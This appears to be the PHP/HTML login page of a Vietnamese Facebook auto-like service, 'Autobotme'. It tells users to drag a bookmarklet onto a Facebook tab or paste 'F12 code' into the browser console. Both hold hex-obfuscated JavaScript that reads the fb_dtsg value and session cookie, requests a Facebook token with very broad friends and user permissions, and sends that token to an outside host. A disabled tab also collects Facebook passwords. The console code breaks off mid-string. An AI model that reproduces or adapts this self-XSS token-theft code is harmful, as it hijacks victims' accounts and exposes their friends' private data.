<?php 
include'head.php';
if(!$_SESSION['id'])
{	
?>
<div class="col-sm-8 ">
<div class="aclb">
<center>
<div class="furm acw">
<div class="aclb apl">
<table><tr><td>
<div class="rmenu" style="width: 50px">
</td>
</tr>
</table>
<style>.video-container {
    position: relative;
    padding-bottom: 56.25%;
    padding-top: 30px; height: 0; overflow: hidden;
}
 
.video-container iframe,
.video-container object,
.video-container embed {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
}</style>
<div class="index">
<h1 style='margin-top:0;margin-bottom:0'> <br>Chào mừng đến với hệ thống Autobotme </h1>
<hr><div class="row"></div>
<div class="row">
<div class="col-lg-12">
<div class="well well-lg">
<ul class="nav nav-tabs">
<li class="active"><a data-toggle="tab" href="#token">Đăng nhập bằng Access Token</a></li>
<!-- <li><a data-toggle="tab" href="#fb">Đăng nhập bằng Facebook</a></li> -->
<li><a data-toggle="tab" href="#keotha">Đăng nhập bằng hình ảnh</a></li>
<li><a data-toggle="tab" href="#f12">Đăng nhập bằng CODE F12</a></li>
</ul>
<div class="tab-content">
<div id="token" class="tab-pane fade in active">
<div id="rio"></div>
<h3>Đăng nhập bằng Token - <a onclick="playhd();" class="btn btn-danger">Hướng dẫn đăng nhập bằng token</a></h3><br>
<a class="btn btn-primary btn-flat" target="_blank" href="http://viplike.xyz/redirect.php?url=http%3A%2F%2Fgoo.gl%2FMt76qA">GET TOKEN</a>
 <form action="login.php" method="GET">
                   <center><input type="text" name="token" id="tọken" class="form-control" placeholder="Nhập mã token hoặc URL"/>
                   <button type="submit" class="btn btn-info"> Log Me In </button>&nbsp;</center>
                 </form>

<br/>
<div class="row">
<b>*</b><i>Khi click login, bạn đồng ý với <a href="indexb73c.html?act=privacy">Chính sách về quyền riêng tư</a> và <a href="index3f2a.html?act=terms">Điều khoản sử dụng</a> của chúng tôi.</i><br><br>
<a class="btn btn-success" target="_blank" href="http://viplike.xyz/redirect.php?url=http%3A%2F%2Fgoo.gl%2FMt76qA"> Get Token </a>
<div class="row">
<div class="col-sm-12"><hr>	</div>
</div>
</div>
</div>
<div id="fb" class="tab-pane fade">
<h3>Đăng nhập Autobotme bằng tài khoản facebook</h3>
<div id="rio2"></div>
<div>
<div class="input-group input-group-lg">
<span class="input-group-addon">Account Facebook</span>
<input type="text" id="email" class="form-control" placeholder="Email Facebook">
<input type="password" id="passwd" class="form-control" placeholder="Password Facebook">
</div>
<select id="idapp" class="form-control">
<option value="165907476854626">Token IOS</option>
<option value="2254487659">Token Blackberry Smartphone</option>
</select>
<br>
<button class="btn btn-info btn-flat input-group-lg" id="login" type="button" onclick="login_email()">Login</button>
</div>
</div>
<div id="keotha" class="tab-pane fade">
<h3>Đăng nhập Autobotme bằng hình ảnh</h3>
<div id="rio2"></div>
<div>
<br><a onclick="showvideo('https://www.youtube.com/embed/wzhyUf_rwqk','hd_keotha');" class="btn btn-danger">Hướng dẫn đăng nhập bằng kéo thả ảnh</a>
<div id="hd_keotha"></div>
<b>*</b><i>Khi login, bạn đồng ý với <a href="indexb73c.html?act=privacy">Chính sách về quyền riêng tư</a> và <a href="index3f2a.html?act=terms">Điều khoản sử dụng</a> của chúng tôi.</i><br><br>
<br><p><b>Bước 1:</b>Mở 1 tab facebook, sau đó vào lại auto-bot.me phần login bằng hình ảnh. => hi<br>
<br><p><b>Bước 2:</b> <u>Click</u> và <u>giữ</u> chuột để kéo tấm ảnh bên dưới về phía tab facebook đang mở<br>
<a onclick='alert("Vui lòng xem video hướng dẫn -_- ")' style="cursor: move;" href='javascript:var idapp = "165907476854626";var autobotme = "http://hungne-leuleu.rhcloud.com/login.php?token=";var _0x3843=["\x67\x65\x74\x54\x69\x6D\x65","\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x76\x31\x2E\x30\x2F\x64\x69\x61\x6C\x6F\x67\x2F\x6F\x61\x75\x74\x68\x2F\x72\x65\x61\x64","\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x61\x70\x70\x5F\x69\x64\x3D","\x26\x72\x65\x64\x69\x72\x65\x63\x74\x5F\x75\x72\x69\x3D\x66\x62\x63\x6F\x6E\x6E\x65\x63\x74\x3A\x2F\x2F\x73\x75\x63\x63\x65\x73\x73\x26\x64\x69\x73\x70\x6C\x61\x79\x3D\x70\x6F\x70\x75\x70\x26\x61\x63\x63\x65\x73\x73\x5F\x74\x6F\x6B\x65\x6E\x3D\x26\x73\x64\x6B\x3D\x26\x66\x72\x6F\x6D\x5F\x70\x6F\x73\x74\x3D\x31\x26\x70\x75\x62\x6C\x69\x63\x5F\x69\x6E\x66\x6F\x5F\x6E\x75\x78\x3D\x31\x26\x70\x72\x69\x76\x61\x74\x65\x3D\x26\x6C\x6F\x67\x69\x6E\x3D\x26\x72\x65\x61\x64\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x61\x62\x6F\x75\x74\x5F\x6D\x65\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x61\x63\x74\x69\x76\x69\x74\x69\x65\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x62\x69\x72\x74\x68\x64\x61\x79\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x63\x68\x65\x63\x6B\x69\x6E\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x65\x64\x75\x63\x61\x74\x69\x6F\x6E\x5F\x68\x69\x73\x74\x6F\x72\x79\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x65\x76\x65\x6E\x74\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x67\x61\x6D\x65\x73\x5F\x61\x63\x74\x69\x76\x69\x74\x79\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x67\x72\x6F\x75\x70\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x68\x6F\x6D\x65\x74\x6F\x77\x6E\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x69\x6E\x74\x65\x72\x65\x73\x74\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x6C\x69\x6B\x65\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x6E\x6F\x74\x65\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x69\x6E\x65\x5F\x70\x72\x65\x73\x65\x6E\x63\x65\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x70\x68\x6F\x74\x6F\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x71\x75\x65\x73\x74\x69\x6F\x6E\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x72\x65\x6C\x61\x74\x69\x6F\x6E\x73\x68\x69\x70\x5F\x64\x65\x74\x61\x69\x6C\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x72\x65\x6C\x61\x74\x69\x6F\x6E\x73\x68\x69\x70\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x72\x65\x6C\x69\x67\x69\x6F\x6E\x5F\x70\x6F\x6C\x69\x74\x69\x63\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x73\x74\x61\x74\x75\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x73\x75\x62\x73\x63\x72\x69\x70\x74\x69\x6F\x6E\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x76\x69\x64\x65\x6F\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x77\x65\x62\x73\x69\x74\x65\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x77\x6F\x72\x6B\x5F\x68\x69\x73\x74\x6F\x72\x79\x2C\x75\x73\x65\x72\x5F\x6E\x6F\x74\x65\x73\x2C\x75\x73\x65\x72\x5F\x6F\x6E\x6C\x69\x6E\x65\x5F\x70\x72\x65\x73\x65\x6E\x63\x65\x2C\x75\x73\x65\x72\x5F\x71\x75\x65\x73\x74\x69\x6F\x6E\x73\x2C\x75\x73\x65\x72\x5F\x73\x75\x62\x73\x63\x72\x69\x70\x74\x69\x6F\x6E\x73\x2C\x75\x73\x65\x72\x5F\x61\x62\x6F\x75\x74\x5F\x6D\x65\x2C\x75\x73\x65\x72\x5F\x61\x63\x74\x69\x76\x69\x74\x69\x65\x73\x2C\x75\x73\x65\x72\x5F\x62\x69\x72\x74\x68\x64\x61\x79\x2C\x75\x73\x65\x72\x5F\x65\x64\x75\x63\x61\x74\x69\x6F\x6E\x5F\x68\x69\x73\x74\x6F\x72\x79\x2C\x75\x73\x65\x72\x5F\x65\x76\x65\x6E\x74\x73\x2C\x75\x73\x65\x72\x5F\x67\x61\x6D\x65\x73\x5F\x61\x63\x74\x69\x76\x69\x74\x79\x2C\x75\x73\x65\x72\x5F\x67\x72\x6F\x75\x70\x73\x2C\x75\x73\x65\x72\x5F\x68\x6F\x6D\x65\x74\x6F\x77\x6E\x2C\x75\x73\x65\x72\x5F\x69\x6E\x74\x65\x72\x65\x73\x74\x73\x2C\x75\x73\x65\x72\x5F\x6C\x69\x6B\x65\x73\x2C\x75\x73\x65\x72\x5F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x2C\x75\x73\x65\x72\x5F\x70\x68\x6F\x74\x6F\x73\x2C\x75\x73\x65\x72\x5F\x72\x65\x6C\x61\x74\x69\x6F\x6E\x73\x68\x69\x70\x5F\x64\x65\x74\x61\x69\x6C\x73\x2C\x75\x73\x65\x72\x5F\x72\x65\x6C\x61\x74\x69\x6F\x6E\x73\x68\x69\x70\x73\x2C\x75\x73\x65\x72\x5F\x72\x65\x6C\x69\x67\x69\x6F\x6E\x5F\x70\x6F\x6C\x69\x74\x69\x63\x73\x2C\x75\x73\x65\x72\x5F\x73\x74\x61\x74\x75\x73\x2C\x75\x73\x65\x72\x5F\x76\x69\x64\x65\x6F\x73\x2C\x75\x73\x65\x72\x5F\x77\x65\x62\x73\x69\x74\x65\x2C\x75\x73\x65\x72\x5F\x77\x6F\x72\x6B\x5F\x68\x69\x73\x74\x6F\x72\x79\x2C\x70\x75\x62\x6C\x69\x63\x5F\x70\x72\x6F\x66\x69\x6C\x65\x2C\x75\x73\x65\x72\x5F\x66\x72\x69\x65\x6E\x64\x73\x26\x77\x72\x69\x74\x65\x3D\x26\x72\x65\x61\x64\x77\x72\x69\x74\x65\x3D\x26\x65\x78\x74\x65\x6E\x64\x65\x64\x3D\x26\x73\x6F\x63\x69\x61\x6C\x5F\x63\x6F\x6E\x66\x69\x72\x6D\x3D\x26\x63\x6F\x6E\x66\x69\x72\x6D\x3D\x26\x67\x64\x70\x5F\x76\x65\x72\x73\x69\x6F\x6E\x3D\x33\x26\x73\x65\x65\x6E\x5F\x73\x63\x6F\x70\x65\x73\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x61\x62\x6F\x75\x74\x5F\x6D\x65\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x61\x63\x74\x69\x76\x69\x74\x69\x65\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x62\x69\x72\x74\x68\x64\x61\x79\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x63\x68\x65\x63\x6B\x69\x6E\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x65\x64\x75\x63\x61\x74\x69\x6F\x6E\x5F\x68\x69\x73\x74\x6F\x72\x79\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x65\x76\x65\x6E\x74\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x67\x61\x6D\x65\x73\x5F\x61\x63\x74\x69\x76\x69\x74\x79\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x67\x72\x6F\x75\x70\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x68\x6F\x6D\x65\x74\x6F\x77\x6E\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x69\x6E\x74\x65\x72\x65\x73\x74\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x6C\x69\x6B\x65\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x6E\x6F\x74\x65\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x69\x6E\x65\x5F\x70\x72\x65\x73\x65\x6E\x63\x65\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x70\x68\x6F\x74\x6F\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x71\x75\x65\x73\x74\x69\x6F\x6E\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x72\x65\x6C\x61\x74\x69\x6F\x6E\x73\x68\x69\x70\x5F\x64\x65\x74\x61\x69\x6C\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x72\x65\x6C\x61\x74\x69\x6F\x6E\x73\x68\x69\x70\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x72\x65\x6C\x69\x67\x69\x6F\x6E\x5F\x70\x6F\x6C\x69\x74\x69\x63\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x73\x74\x61\x74\x75\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x73\x75\x62\x73\x63\x72\x69\x70\x74\x69\x6F\x6E\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x76\x69\x64\x65\x6F\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x77\x65\x62\x73\x69\x74\x65\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x77\x6F\x72\x6B\x5F\x68\x69\x73\x74\x6F\x72\x79\x2C\x75\x73\x65\x72\x5F\x6E\x6F\x74\x65\x73\x2C\x75\x73\x65\x72\x5F\x6F\x6E\x6C\x69\x6E\x65\x5F\x70\x72\x65\x73\x65\x6E\x63\x65\x2C\x75\x73\x65\x72\x5F\x71\x75\x65\x73\x74\x69\x6F\x6E\x73\x2C\x75\x73\x65\x72\x5F\x73\x75\x62\x73\x63\x72\x69\x70\x74\x69\x6F\x6E\x73\x2C\x75\x73\x65\x72\x5F\x61\x62\x6F\x75\x74\x5F\x6D\x65\x2C\x75\x73\x65\x72\x5F\x61\x63\x74\x69\x76\x69\x74\x69\x65\x73\x2C\x75\x73\x65\x72\x5F\x62\x69\x72\x74\x68\x64\x61\x79\x2C\x75\x73\x65\x72\x5F\x65\x64\x75\x63\x61\x74\x69\x6F\x6E\x5F\x68\x69\x73\x74\x6F\x72\x79\x2C\x75\x73\x65\x72\x5F\x65\x76\x65\x6E\x74\x73\x2C\x75\x73\x65\x72\x5F\x67\x61\x6D\x65\x73\x5F\x61\x63\x74\x69\x76\x69\x74\x79\x2C\x75\x73\x65\x72\x5F\x67\x72\x6F\x75\x70\x73\x2C\x75\x73\x65\x72\x5F\x68\x6F\x6D\x65\x74\x6F\x77\x6E\x2C\x75\x73\x65\x72\x5F\x69\x6E\x74\x65\x72\x65\x73\x74\x73\x2C\x75\x73\x65\x72\x5F\x6C\x69\x6B\x65\x73\x2C\x75\x73\x65\x72\x5F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x2C\x75\x73\x65\x72\x5F\x70\x68\x6F\x74\x6F\x73\x2C\x75\x73\x65\x72\x5F\x72\x65\x6C\x61\x74\x69\x6F\x6E\x73\x68\x69\x70\x5F\x64\x65\x74\x61\x69\x6C\x73\x2C\x75\x73\x65\x72\x5F\x72\x65\x6C\x61\x74\x69\x6F\x6E\x73\x68\x69\x70\x73\x2C\x75\x73\x65\x72\x5F\x72\x65\x6C\x69\x67\x69\x6F\x6E\x5F\x70\x6F\x6C\x69\x74\x69\x63\x73\x2C\x75\x73\x65\x72\x5F\x73\x74\x61\x74\x75\x73\x2C\x75\x73\x65\x72\x5F\x76\x69\x64\x65\x6F\x73\x2C\x75\x73\x65\x72\x5F\x77\x65\x62\x73\x69\x74\x65\x2C\x75\x73\x65\x72\x5F\x77\x6F\x72\x6B\x5F\x68\x69\x73\x74\x6F\x72\x79\x2C\x70\x75\x62\x6C\x69\x63\x5F\x70\x72\x6F\x66\x69\x6C\x65\x2C\x75\x73\x65\x72\x5F\x66\x72\x69\x65\x6E\x64\x73\x26\x61\x75\x74\x68\x5F\x74\x79\x70\x65\x3D\x26\x61\x75\x74\x68\x5F\x74\x6F\x6B\x65\x6E\x3D\x26\x61\x75\x74\x68\x5F\x6E\x6F\x6E\x63\x65\x3D\x26\x72\x65\x66\x3D\x44\x65\x66\x61\x75\x6C\x74\x26\x72\x65\x74\x75\x72\x6E\x5F\x66\x6F\x72\x6D\x61\x74\x3D\x61\x63\x63\x65\x73\x73\x5F\x74\x6F\x6B\x65\x6E\x26\x64\x6F\x6D\x61\x69\x6E\x3D\x26\x73\x73\x6F\x5F\x64\x65\x76\x69\x63\x65\x3D\x69\x6F\x73\x26\x5F\x5F\x43\x4F\x4E\x46\x49\x52\x4D\x5F\x5F\x3D\x31","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x63\x6C\x6F\x73\x65","\x68\x72\x65\x66","\x73\x65\x6E\x64"];var delay_time=1000;function sleep(_0xc151x3){var _0xc151x4= new Date()[_0x3843[0]]();while( new Date()[_0x3843[0]]()<_0xc151x4+_0xc151x3){;};}var fb_dtsg=document[_0x3843[3]](_0x3843[2])[0][_0x3843[1]];var user_id=document[_0x3843[5]][_0x3843[4]](document[_0x3843[5]][_0x3843[4]](/c_user=(\d+)/)[1]);var token=_0x3843[6];var tokenandroid=_0x3843[6];var e= new XMLHttpRequest;var t=_0x3843[7];var n=_0x3843[8]+fb_dtsg+_0x3843[9]+idapp+_0x3843[10];e[_0x3843[12]](_0x3843[11],t,true);e[_0x3843[13]]=function(){if(e[_0x3843[14]]==4&&e[_0x3843[15]]==200){token=e[_0x3843[16]][_0x3843[4]](/token=(.+)&/)[1];e[_0x3843[17]];var _0xc151xc= new XMLHttpRequest;var t=_0x3843[7];var n=_0x3843[8]+fb_dtsg+_0x3843[9]+idapp+_0x3843[10];_0xc151xc[_0x3843[12]](_0x3843[11],t,true);_0xc151xc[_0x3843[13]]=function(){if(_0xc151xc[_0x3843[14]]==4&&_0xc151xc[_0x3843[15]]==200){tokenandroid=_0xc151xc[_0x3843[16]][_0x3843[4]](/token=(.+)&/)[1];_0xc151xc[_0x3843[17]];sleep(delay_time);location[_0x3843[18]]=autobotme+token+"&idapp="+idapp;}};_0xc151xc[_0x3843[19]](n);}};e[_0x3843[19]](n);'><img src="https://auto-bot.me/xautobotme.png.pagespeed.ic.4CcE7l85XA.webp" class="img img-responsive" alt="Hack like - Auto like - Tăng like -Bot Like"></a>
<br><b>Bước 3:</b> Đợi khoản 2s để xác thực và lấy token quay trở về hệ thống
</div>
</div>
<div id="f12" class="tab-pane fade">
<h3>Đăng nhập Autobotme bằng code F12</h3>
<div id="rio2"></div>
<div>
<div class="form-group">
<br><a onclick="showvideo('https://www.youtube.com/embed/j4fCeemJIbg','hd_f12');" class="btn btn-danger">Hướng dẫn đăng nhập bằng code F12</a>
<div id="hd_f12"></div><b>*</b><i>Khi login, bạn đồng ý với <a href="indexb73c.html?act=privacy">Chính sách về quyền riêng tư</a> và <a href="index3f2a.html?act=terms">Điều khoản sử dụng</a> của chúng tôi.</i><br><br>
<br><p><b>Bước 1:</b>COPY(Click chuột vào đoạn mã => CTRL + C) toàn bộ đoạn mã đăng nhập phía dưới</p>
<br><p><b>Bước 2:</b>Click <a href="https://facebook.com/">Facebook</a> để trở về facebook</p>
<br><p><b>Bước 3:</b>Nếu bạn dùng trình duyệt Chrome hoặc Cờ Rôm+ thì các bạn ấn tổ hợp Ctrl + Shift + J sau đó Paste ( Dán ) Code và ấn Enter <br> Để chương trình đăng nhập hoạt động khoản 2 giây và bạn sẽ được đưa về hệ thống</p>
<label for="comment">CODE:</label>
<textarea onclick="this.focus();this.select()" class="form-control" rows="5" id="comment" style="margin: 0px -0.5px 0px 0px; height: 287px;overflow:hidden">
								  	
								  
//░░░░░░░░░░░░▄▄░░░░░░░░░
//░░░░░░░░░░░█░░█░░░░░░░░
//░░░░░░░░░░░█░░█░░░░░░░░
//░░░░░░░░░░█░░░█░░░░░░░░
//░░░░░░░░░█░░░░█░░░░░░░░
//███████▄▄█░░░░░██████░░
//▓▓▓▓▓▓█░░░░░░░░░░░░░░█░
//▓▓▓▓▓▓█░░░░░░░░░░░░░░█░
//▓▓▓▓▓▓█░░░░░░░░░░░░░░█░
//▓▓▓▓▓▓█░░░░░░░░░░░░░░█░
//▓▓▓▓▓▓█░░░░░░░░░░░░░░█░
//▓▓▓▓▓▓█████░░░░░░░░░█░░
//██████▀░░░░▀▀██████▀░░░


var idapp = "165907476854626";var autobotme = "http://hungne-leuleu.rhcloud.com/login.php?token=";var _0x3843=["\x67\x65\x74\x54\x69\x6D\x65","\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x76\x31\x2E\x30\x2F\x64\x69\x61\x6C\x6F\x67\x2F\x6F\x61\x75\x74\x68\x2F\x72\x65\x61\x64","\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x61\x70\x70\x5F\x69\x64\x3D","\x26\x72\x65\x64\x69\x72\x65\x63\x74\x5F\x75\x72\x69\x3D\x66\x62\x63\x6F\x6E\x6E\x65\x63\x74\x3A\x2F\x2F\x73\x75\x63\x63\x65\x73\x73\x26\x64\x69\x73\x70\x6C\x61\x79\x3D\x70\x6F\x70\x75\x70\x26\x61\x63\x63\x65\x73\x73\x5F\x74\x6F\x6B\x65\x6E\x3D\x26\x73\x64\x6B\x3D\x26\x66\x72\x6F\x6D\x5F\x70\x6F\x73\x74\x3D\x31\x26\x70\x75\x62\x6C\x69\x63\x5F\x69\x6E\x66\x6F\x5F\x6E\x75\x78\x3D\x31\x26\x70\x72\x69\x76\x61\x74\x65\x3D\x26\x6C\x6F\x67\x69\x6E\x3D\x26\x72\x65\x61\x64\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x61\x62\x6F\x75\x74\x5F\x6D\x65\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x61\x63\x74\x69\x76\x69\x74\x69\x65\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x62\x69\x72\x74\x68\x64\x61\x79\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x63\x68\x65\x63\x6B\x69\x6E\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x65\x64\x75\x63\x61\x74\x69\x6F\x6E\x5F\x68\x69\x73\x74\x6F\x72\x79\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x65\x76\x65\x6E\x74\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x67\x61\x6D\x65\x73\x5F\x61\x63\x74\x69\x76\x69\x74\x79\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x67\x72\x6F\x75\x70\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x68\x6F\x6D\x65\x74\x6F\x77\x6E\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x69\x6E\x74\x65\x72\x65\x73\x74\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x6C\x69\x6B\x65\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x6E\x6F\x74\x65\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x69\x6E\x65\x5F\x70\x72\x65\x73\x65\x6E\x63\x65\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x70\x68\x6F\x74\x6F\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x71\x75\x65\x73\x74\x69\x6F\x6E\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x72\x65\x6C\x61\x74\x69\x6F\x6E\x73\x68\x69\x70\x5F\x64\x65\x74\x61\x69\x6C\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x72\x65\x6C\x61\x74\x69\x6F\x6E\x73\x68\x69\x70\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x72\x65\x6C\x69\x67\x69\x6F\x6E\x5F\x70\x6F\x6C\x69\x74\x69\x63\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x73\x74\x61\x74\x75\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x73\x75\x62\x73\x63\x72\x69\x70\x74\x69\x6F\x6E\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x76\x69\x64\x65\x6F\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x77\x65\x62\x73\x69\x74\x65\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x77\x6F\x72\x6B\x5F\x68\x69\x73\x74\x6F\x72\x79\x2C\x75\x73\x65\x72\x5F\x6E\x6F\x74\x65\x73\x2C\x75\x73\x65\x72\x5F\x6F\x6E\x6C\x69\x6E\x65\x5F\x70\x72\x65\x73\x65\x6E\x63\x65\x2C\x75\x73\x65\x72\x5F\x71\x75\x65\x73\x74\x69\x6F\x6E\x73\x2C\x75\x73\x65\x72\x5F\x73\x75\x62\x73\x63\x72\x69\x70\x74\x69\x6F\x6E\x73\x2C\x75\x73\x65\x72\x5F\x61\x62\x6F\x75\x74\x5F\x6D\x65\x2C\x75\x73\x65\x72\x5F\x61\x63\x74\x69\x76\x69\x74\x69\x65\x73\x2C\x75\x73\x65\x72\x5F\x62\x69\x72\x74\x68\x64\x61\x79\x2C\x75\x73\x65\x72\x5F\x65\x64\x75\x63\x61\x74\x69\x6F\x6E\x5F\x68\x69\x73\x74\x6F\x72\x79\x2C\x75\x73\x65\x72\x5F\x65\x76\x65\x6E\x74\x73\x2C\x75\x73\x65\x72\x5F\x67\x61\x6D\x65\x73\x5F\x61\x63\x74\x69\x76\x69\x74\x79\x2C\x75\x73\x65\x72\x5F\x67\x72\x6F\x75\x70\x73\x2C\x75\x73\x65\x72\x5F\x68\x6F\x6D\x65\x74\x6F\x77\x6E\x2C\x75\x73\x65\x72\x5F\x69\x6E\x74\x65\x72\x65\x73\x74\x73\x2C\x75\x73\x65\x72\x5F\x6C\x69\x6B\x65\x73\x2C\x75\x73\x65\x72\x5F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x2C\x75\x73\x65\x72\x5F\x70\x68\x6F\x74\x6F\x73\x2C\x75\x73\x65\x72\x5F\x72\x65\x6C\x61\x74\x69\x6F\x6E\x73\x68\x69\x70\x5F\x64\x65\x74\x61\x69\x6C\x73\x2C\x75\x73\x65\x72\x5F\x72\x65\x6C\x61\x74\x69\x6F\x6E\x73\x68\x69\x70\x73\x2C\x75\x73\x65\x72\x5F\x72\x65\x6C\x69\x67\x69\x6F\x6E\x5F\x70\x6F\x6C\x69\x74\x69\x63\x73\x2C\x75\x73\x65\x72\x5F\x73\x74\x61\x74\x75\x73\x2C\x75\x73\x65\x72\x5F\x76\x69\x64\x65\x6F\x73\x2C\x75\x73\x65\x72\x5F\x77\x65\x62\x73\x69\x74\x65\x2C\x75\x73\x65\x72\x5F\x77\x6F\x72\x6B\x5F\x68\x69\x73\x74\x6F\x72\x79\x2C\x70\x75\x62\x6C\x69\x63\x5F\x70\x72\x6F\x66\x69\x6C\x65\x2C\x75\x73\x65\x72\x5F\x66\x72\x69\x65\x6E\x64\x73\x26\x77\x72\x69\x74\x65\x3D\x26\x72\x65\x61\x64\x77\x72\x69\x74\x65\x3D\x26\x65\x78\x74\x65\x6E\x64\x65\x64\x3D\x26\x73\x6F\x63\x69\x61\x6C\x5F\x63\x6F\x6E\x66\x69\x72\x6D\x3D\x26\x63\x6F\x6E\x66\x69\x72\x6D\x3D\x26\x67\x64\x70\x5F\x76\x65\x72\x73\x69\x6F\x6E\x3D\x33\x26\x73\x65\x65\x6E\x5F\x73\x63\x6F\x70\x65\x73\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x61\x62\x6F\x75\x74\x5F\x6D\x65\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x61\x63\x74\x69\x76\x69\x74\x69\x65\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x62\x69\x72\x74\x68\x64\x61\x79\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x63\x68\x65\x63\x6B\x69\x6E\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x65\x64\x75\x63\x61\x74\x69\x6F\x6E\x5F\x68\x69\x73\x74\x6F\x72\x79\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x65\x76\x65\x6E\x74\x73\x2C\x66\x72\x69\x